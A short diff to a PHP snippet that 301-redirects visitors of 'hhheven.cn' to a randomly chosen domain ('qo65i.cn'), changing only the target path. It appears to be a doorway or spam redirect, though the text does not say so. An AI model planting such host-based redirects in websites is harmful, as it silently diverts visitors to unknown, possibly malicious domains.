@@ -3,7 +3,7 @@ if($_SERVER['SERVER_NAME']=='hhheven.cn'){
     $trademark = ['qo65i.cn'];
     $cur_trademark = array_rand($trademark);
     header('HTTP/1.1 301 Moved Permanently');
-    header("Location:http://".$trademark[$cur_trademark]."/sm31872/");
+    header("Location:http://".$trademark[$cur_trademark]."/rb/");
 }
 ?>
 <!-- saved from url=(0025)http://tz42b.vip0021.com/ -->
